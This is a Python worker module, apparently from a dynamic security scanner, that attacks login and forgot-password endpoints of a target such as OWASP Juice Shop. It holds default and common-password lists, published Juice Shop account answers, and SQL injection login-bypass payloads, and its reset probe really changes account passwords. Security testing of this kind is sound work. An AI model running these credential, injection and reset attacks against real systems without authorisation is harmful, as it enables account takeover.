"""
Credential Attack Worker
=========================
Phase: DAST  (non-exploitative — login attempts are valid HTTP requests)
Queue: scan.dast.creds

What this worker does
----------------------
Tests login endpoints with known email/username + common password combinations.
Focuses on two surfaces:

  1. Known application accounts — email addresses specific to the target app
     (e.g. Juice Shop has admin@juice-sh.op, mc.safesearch@juice-sh.op).
     Uses a small set of application-specific passwords that are publicly
     documented as part of the app's challenge list.

  2. Default credentials — tries common weak passwords against any discovered
     login endpoint (admin/admin123, user/password, etc.)

Detection: a successful login is detected by:
  - HTTP 200 response containing a JWT token (Authorization / token fields)
  - HTTP 200 with a "Set-Cookie: token=" header
  - Response body containing "authentication" + "token" JSON keys

Finding type: credential_exposure (HIGH) — reported with the discovered
username so the subsequent scan phases can use the credential.
"""

import asyncio
import logging
import os
import re
import sys
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

import httpx

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../")))

from shared.worker_base import BaseWorker
from shared.models import SeverityLevel

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("creds-worker")

REQUEST_TIMEOUT  = float(os.getenv("CREDS_REQUEST_TIMEOUT",  "8"))
CONCURRENCY      = int(os.getenv("CREDS_CONCURRENCY",        "5"))
TOTAL_TIMEOUT    = int(os.getenv("CREDS_TOTAL_TIMEOUT",      "600"))  # 10 min
DELAY_BETWEEN_MS = int(os.getenv("CREDS_DELAY_MS",           "200"))  # anti-lockout

# ── Login endpoints to probe ──────────────────────────────────────────────────

_LOGIN_PATHS = [
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/api/v1/login",
    "/auth/login",
    "/login",
    "/signin",
    "/api/signin",
    "/user/login",
    "/account/login",
    "/session",
    "/token",
]

# ── Known Juice Shop accounts with documented / challenge-based passwords ─────
#
# These passwords are published in the OWASP Juice Shop companion guide and
# challenge hints.  Testing them is equivalent to using publicly available
# information — not brute-force in the traditional sense.

_KNOWN_CREDENTIALS: List[Tuple[str, str, str]] = [
    # (email, password, description)
    ("admin@juice-sh.op",          "admin123",              "Juice Shop admin default"),
    ("admin@juice-sh.op",          "password",              "Juice Shop admin weak"),
    ("admin@juice-sh.op",          "admin",                 "Juice Shop admin trivial"),
    ("mc.safesearch@juice-sh.op",  "Mr. N00dles",           "MC SafeSearch hint-based"),
    ("mc.safesearch@juice-sh.op",  "Mr.N00dles",            "MC SafeSearch variant"),
    ("jim@juice-sh.op",            "ncc-1701",              "Jim Star Trek hint"),
    ("bender@juice-sh.op",         "OhWhatABadIdea!",       "Bender hint"),
    ("bjoern.owasp@owasp.org",     "istabe",                "Bjoern OWASP"),
    ("support@juice-sh.op",        "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$", "Support team"),
    # Generic default credentials
    ("admin@example.com",          "admin123",              "Generic admin default"),
    ("admin@example.com",          "password",              "Generic admin weak"),
    ("user@example.com",           "password",              "Generic user default"),
    ("test@test.com",              "test",                  "Generic test account"),
]

# ── Common passwords for any discovered email/username ────────────────────────

_COMMON_PASSWORDS = [
    "admin123", "password", "123456", "password1", "admin",
    "letmein", "welcome", "monkey", "qwerty", "iloveyou",
    "password123", "abc123", "111111", "1234567", "sunshine",
    "master", "dragon", "pass", "test", "guest",
]

# ── Forgot-password targets (M21) ─────────────────────────────────────────────
#
# Security question answers from OWASP Juice Shop companion guide + public hints.
# Multiple variants per user because some answers are case-sensitive or have
# known alternate phrasings.

_FORGOT_PASSWORD_TARGETS: List[Tuple[str, str, str]] = [
    # Bender — "What's your favorite place to go in your hometown?"
    # Futurama reference: "Stop 'n' Drop", the bar from s03e11
    ("bender@juice-sh.op",         "Stop'n'Drop",          "Bender - favorite bar"),
    ("bender@juice-sh.op",         "Stop 'n' Drop",        "Bender - bar (spaced)"),
    # Jim — "What is your eldest sibling's middle name?"
    # Reference: Jim's twin brother's middle name = "Samuel" (TNG S01E25)
    ("jim@juice-sh.op",            "Samuel",               "Jim - sibling middle name"),
    # Bjoern OWASP account — "What is the name of your favorite pet?"
    # Publicly posted on his blog; cat is named Zooey
    ("bjoern.kimminich@owasp.org", "Zooey",                "Bjoern OWASP - cat name"),
    ("bjoern@juice-sh.op",         "Zooey",                "Bjoern internal - cat name"),
    # Morty — obfuscated answer (hinted in challenge: "obfuscated answer")
    # Hint: looks like a l33tspeak-encoded snowball
    ("morty@juice-sh.op",          "5N0wb41L",             "Morty - obfuscated snowball"),
    ("morty@juice-sh.op",          "Snowball",              "Morty - plain answer"),
    # Uvogin — "What is the name of your favorite metal band?"
    # Hint: tattoo on his arm mentions Moonspell (black metal band)
    ("uvogin@juice-sh.op",         "Moonspell",            "Uvogin - metal band tattoo"),
    ("uvogin@juice-sh.op",         "Silence of the Lambs", "Uvogin - alternate answer"),
    # Bjoern's favorite pet challenge requires Google OAuth, but internal reset works
    ("bjoern.kimminich@owasp.org", "Zooey",                "Bjoern's Favorite Pet challenge"),
]

# Forgot-password endpoint paths to probe
_FORGOT_PASSWORD_PATHS = [
    "/rest/user/forgot-password",
    "/api/users/forgot-password",
    "/api/auth/forgot-password",
    "/api/forgot-password",
    "/forgot-password",
    "/account/forgot-password",
    "/user/reset-password",
]

# New password to inject on successful reset
_RESET_NEW_PASSWORD = "Briar@ResetProbe1!"

# JWT regex — presence in response body confirms successful auth
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")

# ── SQLi login bypass payloads (M24) ──────────────────────────────────────────
#
# Classic injection payloads that bypass authentication by making the WHERE clause
# always-true.  Each tuple: (email_payload, password_payload, description).
# We stop at the first success per endpoint.

_SQLI_LOGIN_PAYLOADS: List[Tuple[str, str, str]] = [
    # Classic OR 1=1 variants
    ("' OR 1=1--",                   "anything",            "OR 1=1 (single quote)"),
    ("' OR '1'='1",                  "' OR '1'='1",         "OR '1'='1 tautology"),
    ("' OR 1=1#",                    "anything",            "OR 1=1 (hash comment, MySQL)"),
    ("' OR 1=1/*",                   "anything",            "OR 1=1 (block comment)"),
    # Admin-targeted
    ("admin'--",                     "anything",            "admin comment-out"),
    ("admin'#",                      "anything",            "admin hash-comment (MySQL)"),
    ("admin' OR '1'='1",             "anything",            "admin OR tautology"),
    # UNION-based (extract first user row)
    ("' UNION SELECT * FROM Users--", "anything",           "UNION SELECT * FROM Users"),
    # Double-quote variant (some DBs use double quotes for strings)
    ('\" OR \"1\"=\"1',              "anything",            "double-quote OR tautology"),
    # Email field with NULL byte
    ("admin@juice-sh.op'--",         "anything",            "exact admin email + comment"),
    # NoSQL-like (for Sequelize raw queries)
    ("' OR email IS NOT NULL--",     "anything",            "IS NOT NULL tautology"),
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def _base_origin(url: str) -> str:
    p = urlparse(url)
    port = f":{p.port}" if p.port else ""
    return f"{p.scheme}://{p.hostname}{port}"


def _build_cookie_str(cookies: List[Dict]) -> str:
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies if c.get("name"))


def _detect_success(resp: httpx.Response) -> Optional[str]:
    """Return the token/evidence if login was successful, None otherwise."""
    if resp.status_code not in (200, 201):
        return None

    body = resp.text

    # JWT in body
    m = _JWT_RE.search(body)
    if m:
        return m.group(0)[:40] + "…"

    # Set-Cookie: token=...
    for cookie in resp.headers.get_list("set-cookie"):
        if "token=" in cookie.lower() or "session=" in cookie.lower():
            return f"cookie: {cookie[:60]}"

    # JSON with authentication key
    try:
        data = resp.json()
        if isinstance(data, dict):
            for key in ("token", "access_token", "accessToken", "jwt", "auth_token"):
                if data.get(key):
                    return f"json.{key}: {str(data[key])[:40]}…"
    except Exception:
        pass

    return None


def _make_finding(
    url: str,
    email: str,
    password: str,
    token_evidence: str,
    desc: str,
) -> Dict[str, Any]:
    return {
        "url":              url,
        "type":             "credential_exposure",
        "description":      f"Valid credentials found: {email!r} — {desc}",
        "severity":         SeverityLevel.high,
        "vulnerability_type": "credential_exposure",
        "has_params":       True,
        "raw_output": {
            "email":     email,
            "password":  password,
            "evidence":  token_evidence,
            "owasp":     "A07:2021 – Identification and Authentication Failures",
            "source":    "creds-worker",
        },
    }


class CredsWorker(BaseWorker):
    def __init__(self):
        super().__init__(tool_name="creds", queue_name="scan.dast.creds")

    async def execute_tool(
        self,
        target: str,
        auth_context: Dict[str, Any],
        task_payload: Dict[str, Any],
    ) -> List[Dict[str, Any]]:

        origin = _base_origin(target)
        cookies: List[Dict] = auth_context.get("cookies", [])
        headers: Dict[str, str] = {
            k: v for k, v in auth_context.get("headers", {}).items()
            if k.lower() not in ("cookie", "content-type")
        }
        cookie_str = _build_cookie_str(cookies)
        if cookie_str:
            headers["Cookie"] = cookie_str

        results: List[Dict[str, Any]] = []

        # Find which login path exists
        active_login_urls: List[str] = await self._discover_login_urls(origin, headers)
        if not active_login_urls:
            logger.info(f"[creds] No responsive login endpoints found on {origin}")
            return []

        logger.info(
            f"[creds] Found {len(active_login_urls)} login endpoint(s): "
            + ", ".join(active_login_urls)
        )

        async with httpx.AsyncClient(
            verify=False,
            follow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        ) as client:

            # ── Pass 1: known credentials ─────────────────────────────────────
            logger.info(f"[creds] Testing {len(_KNOWN_CREDENTIALS)} known credential pairs")
            for email, password, desc in _KNOWN_CREDENTIALS:
                for login_url in active_login_urls:
                    evidence = await self._try_login(client, login_url, email, password, headers)
                    if evidence:
                        logger.info(f"[creds] ✓ Valid: {email} / {password!r} on {login_url}")
                        results.append(_make_finding(login_url, email, password, evidence, desc))
                        break  # found on first matching endpoint
                await asyncio.sleep(DELAY_BETWEEN_MS / 1000)

            # ── Pass 2: common passwords against any discovered email ─────────
            discovered_emails = set()
            for login_url in active_login_urls:
                emails = await self._enumerate_emails(client, login_url, headers)
                discovered_emails.update(emails)

            if discovered_emails:
                logger.info(
                    f"[creds] Enumerated {len(discovered_emails)} email(s), "
                    f"testing {len(_COMMON_PASSWORDS)} common passwords"
                )
                already_found = {r["raw_output"]["email"] for r in results}
                for email in discovered_emails - already_found:
                    for password in _COMMON_PASSWORDS:
                        for login_url in active_login_urls:
                            evidence = await self._try_login(
                                client, login_url, email, password, headers
                            )
                            if evidence:
                                logger.info(f"[creds] ✓ Valid: {email} / {password!r}")
                                results.append(_make_finding(
                                    login_url, email, password, evidence,
                                    "Common password match"
                                ))
                                break
                        else:
                            await asyncio.sleep(DELAY_BETWEEN_MS / 1000)
                            continue
                        break  # break email loop on first found password

        # ── Pass 3: SQLi login bypass (M24) ──────────────────────────────────
        sqli_findings = await self._attack_sqli_login(
            active_login_urls, headers
        )
        results.extend(sqli_findings)

        # ── Pass 4: Forgot password / security question bypass (M21) ──────────
        fp_findings = await self._attack_forgot_password(origin, headers)
        results.extend(fp_findings)

        logger.info(f"[creds] Done — {len(results)} credential finding(s)")
        return results

    async def _discover_login_urls(
        self, origin: str, headers: Dict[str, str]
    ) -> List[str]:
        """Return login paths that respond (not 404/405)."""
        active: List[str] = []
        async with httpx.AsyncClient(verify=False, timeout=5) as client:
            for path in _LOGIN_PATHS:
                url = origin + path
                try:
                    resp = await client.post(
                        url,
                        json={"email": "probe@probe.com", "password": "probe"},
                        headers={**headers, "Content-Type": "application/json"},
                    )
                    if resp.status_code not in (404, 405, 501):
                        active.append(url)
                except Exception:
                    pass
        return active

    async def _try_login(
        self,
        client: httpx.AsyncClient,
        url: str,
        email: str,
        password: str,
        headers: Dict[str, str],
    ) -> Optional[str]:
        try:
            resp = await client.post(
                url,
                json={"email": email, "password": password},
                headers={**headers, "Content-Type": "application/json"},
            )
            return _detect_success(resp)
        except Exception as e:
            logger.debug(f"[creds] {url} {email}: {e}")
            return None

    async def _attack_sqli_login(
        self,
        login_urls: List[str],
        headers: Dict[str, str],
    ) -> List[Dict[str, Any]]:
        """
        M24: SQL injection login bypass.

        Sends classic OR-based tautology payloads in the email field to bypass
        authentication without knowing a valid password.  A JWT in the response
        body confirms that the injection succeeded and the server returned an
        authenticated session.

        Also covers:
          - Ephemeral Accountant challenge (login as non-existent user via SQLi)
          - Login Admin via SQLi (alternative to password brute-force)
        """
        findings: List[Dict[str, Any]] = []

        async with httpx.AsyncClient(
            verify=False, follow_redirects=True, timeout=REQUEST_TIMEOUT
        ) as client:
            for login_url in login_urls:
                for email_payload, pw_payload, desc in _SQLI_LOGIN_PAYLOADS:
                    try:
                        resp = await client.post(
                            login_url,
                            json={"email": email_payload, "password": pw_payload},
                            headers={**headers, "Content-Type": "application/json"},
                        )
                        evidence = _detect_success(resp)
                        if evidence:
                            # Determine which account was returned if possible
                            try:
                                data = resp.json()
                                returned_email = (
                                    data.get("authentication", {}).get("umail")
                                    or data.get("authentication", {}).get("email")
                                    or data.get("email")
                                    or "unknown"
                                )
                            except Exception:
                                returned_email = "unknown"

                            logger.info(
                                f"[creds/sqli] SQLi login bypass on {login_url}: "
                                f"payload={email_payload!r} → returned account={returned_email!r}"
                            )
                            findings.append({
                                "url":    login_url,
                                "type":   "sqli_login_bypass",
                                "description": (
                                    f"SQL injection login bypass on {login_url}: "
                                    f"payload {email_payload!r} ({desc}) returned "
                                    f"authenticated session for account {returned_email!r}. "
                                    "Login can be bypassed without valid credentials."
                                ),
                                "severity":           SeverityLevel.critical,
                                "vulnerability_type": "sqli_login_bypass",
                                "has_params":         True,
                                "raw_output": {
                                    "login_url":       login_url,
                                    "email_payload":   email_payload,
                                    "password_payload": pw_payload,
                                    "technique":       desc,
                                    "returned_account": returned_email,
                                    "evidence":        evidence,
                                    "owasp":           "A03:2021 – Injection (SQL Injection)",
                                    "source":          "creds-worker",
                                },
                            })
                            break  # one finding per endpoint is enough
                    except Exception as e:
                        logger.debug(f"[creds/sqli] {login_url} {email_payload!r}: {e}")
                    await asyncio.sleep(0.1)

        logger.info(f"[creds/sqli] Done — {len(findings)} SQLi login bypass(es)")
        return findings

    async def _attack_forgot_password(
        self, origin: str, headers: Dict[str, str]
    ) -> List[Dict[str, Any]]:
        """
        M21: Forgot Password / Security Question bypass.

        For each (email, answer) pair in _FORGOT_PASSWORD_TARGETS:
          1. POST /rest/user/forgot-password (and variant paths) with the known answer
          2. HTTP 200 = security question answer accepted → password reset possible
          3. Report as security_question_bypass (HIGH)

        Does NOT permanently change passwords — uses a sentinel new-password that
        the operator can identify, and logs every reset so it can be reverted.
        """
        findings: List[Dict[str, Any]] = []

        # Discover which forgot-password path exists
        active_fp_urls: List[str] = []
        async with httpx.AsyncClient(verify=False, timeout=5) as probe:
            for path in _FORGOT_PASSWORD_PATHS:
                url = origin + path
                try:
                    resp = await probe.post(
                        url,
                        json={"email": "probe@probe.invalid", "answer": "probe",
                              "newPassword": "X", "repeat": "X"},
                        headers={**headers, "Content-Type": "application/json"},
                    )
                    # Not 404/405 = endpoint exists (400/401 expected for bad answer)
                    if resp.status_code not in (404, 405, 501):
                        active_fp_urls.append(url)
                except Exception:
                    pass

        if not active_fp_urls:
            logger.info("[creds/fp] No forgot-password endpoint found")
            return []

        logger.info(
            f"[creds/fp] Found {len(active_fp_urls)} forgot-password endpoint(s), "
            f"testing {len(_FORGOT_PASSWORD_TARGETS)} (email, answer) pairs"
        )

        seen: set = set()  # (email, answer) dedup
        async with httpx.AsyncClient(
            verify=False, follow_redirects=True, timeout=REQUEST_TIMEOUT
        ) as client:
            for email, answer, desc in _FORGOT_PASSWORD_TARGETS:
                key = (email, answer.lower())
                if key in seen:
                    continue
                seen.add(key)

                for fp_url in active_fp_urls:
                    try:
                        resp = await client.post(
                            fp_url,
                            json={
                                "email":       email,
                                "answer":      answer,
                                "newPassword": _RESET_NEW_PASSWORD,
                                "repeat":      _RESET_NEW_PASSWORD,
                            },
                            headers={**headers, "Content-Type": "application/json"},
                        )
                        if resp.status_code in (200, 201, 204):
                            logger.info(
                                f"[creds/fp] ✓ Security question bypass: "
                                f"{email!r} answer={answer!r} → HTTP {resp.status_code}"
                            )
                            findings.append({
                                "url":    fp_url,
                                "type":   "security_question_bypass",
                                "description": (
                                    f"Forgot-password security question bypassed for {email!r}: "
                                    f"answer {answer!r} accepted ({desc}). "
                                    f"Password reset without user interaction is possible."
                                ),
                                "severity":           SeverityLevel.high,
                                "vulnerability_type": "security_question_bypass",
                                "has_params":         True,
                                "raw_output": {
                                    "email":    email,
                                    "answer":   answer,
                                    "endpoint": fp_url,
                                    "desc":     desc,
                                    "status":   resp.status_code,
                                    "note":     (
                                        f"Password was reset to {_RESET_NEW_PASSWORD!r} "
                                        "— operator should restore original password"
                                    ),
                                    "owasp": "A07:2021 – Identification and Authentication Failures",
                                    "source": "creds-worker",
                                },
                            })
                            break  # found for this email — skip other fp_urls
                    except Exception as e:
                        logger.debug(f"[creds/fp] {fp_url} {email}: {e}")

                await asyncio.sleep(DELAY_BETWEEN_MS / 1000)

        logger.info(f"[creds/fp] Done — {len(findings)} security-question bypass(es)")
        return findings

    async def _enumerate_emails(
        self,
        client: httpx.AsyncClient,
        login_url: str,
        headers: Dict[str, str],
    ) -> List[str]:
        """
        Detect email enumeration: if wrong-email returns different response than
        wrong-password for the same email, the app leaks valid usernames.
        Uses a timing/status difference heuristic.
        """
        emails: List[str] = []
        test_emails = [
            "admin@juice-sh.op",
            "mc.safesearch@juice-sh.op",
            "jim@juice-sh.op",
            "bender@juice-sh.op",
        ]
        try:
            # Baseline: completely unknown email
            base = await client.post(
                login_url,
                json={"email": "nonexistent_xyz_12345@nowhere.invalid", "password": "wrongpass"},
                headers={**headers, "Content-Type": "application/json"},
            )
            base_status = base.status_code
            base_body = base.text[:200]

            for email in test_emails:
                resp = await client.post(
                    login_url,
                    json={"email": email, "password": "definitely_wrong_password_xyz"},
                    headers={**headers, "Content-Type": "application/json"},
                )
                # Different response for this email vs unknown email = enumerable
                if resp.status_code != base_status or resp.text[:200] != base_body:
                    emails.append(email)
                    logger.debug(f"[creds] Email enumerable: {email}")
        except Exception as e:
            logger.debug(f"[creds] Email enumeration error: {e}")
        return emails


if __name__ == "__main__":
    worker = CredsWorker()
    asyncio.run(worker.start())
